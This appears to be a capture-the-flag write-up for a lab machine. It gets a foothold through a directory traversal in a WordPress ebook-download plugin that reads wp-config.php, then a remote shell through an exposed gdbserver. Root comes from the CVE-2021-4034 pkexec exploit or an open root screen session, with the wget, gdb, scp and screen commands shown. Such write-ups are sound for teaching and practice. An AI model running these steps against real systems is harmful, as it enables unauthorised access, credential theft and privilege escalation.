## Path

### User

1. `wpscan` shows that the plugin `ebook-download` has directory traversal. We can download the files on the box.

```
wget http://$ip/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```

2. Scan all ports found port 1337 is open.
3. Connect to port 1337, but nothing happen.
4. Write the script `read_file.py` to leverage the file read vuln to find out which process might be running the port 1337, and get its cmdline. The result shows that it is a gdb server:

```
/bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
```

5. Use `gdb` to connect to the gdb server.

```
$ gdb
pwndbg> target remote 10.10.11.125:1337
Remote debugging using 10.10.11.125:1337
Reading /usr/bin/true from remote target...
```

6. Follow [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver#upload-and-execute) to get a reverse shell.

### Root

1. `screen` has SUID, and there's a script keep screen root session running, so it might be the way.

2. Run `linpeas` and found CVE-2021-4034 useable.

3. Run the exploit [CVE-2021-4034](https://www.exploit-db.com/exploits/50689).

```
## compile locally
$ make

## put on the box
$ scp -i ../ssh/id_ed25519 evil.so user@10.10.11.125:/tmp
$ scp -i ../ssh/id_ed25519 exploit.c user@10.10.11.125:/tmp

## run exploit and get root shell
$ cd /tmp; ./exploit
# whoami
root
```

4. The intended solution seems to be using the root session of `screen` to become root.
```
$ screen -x root/root
```
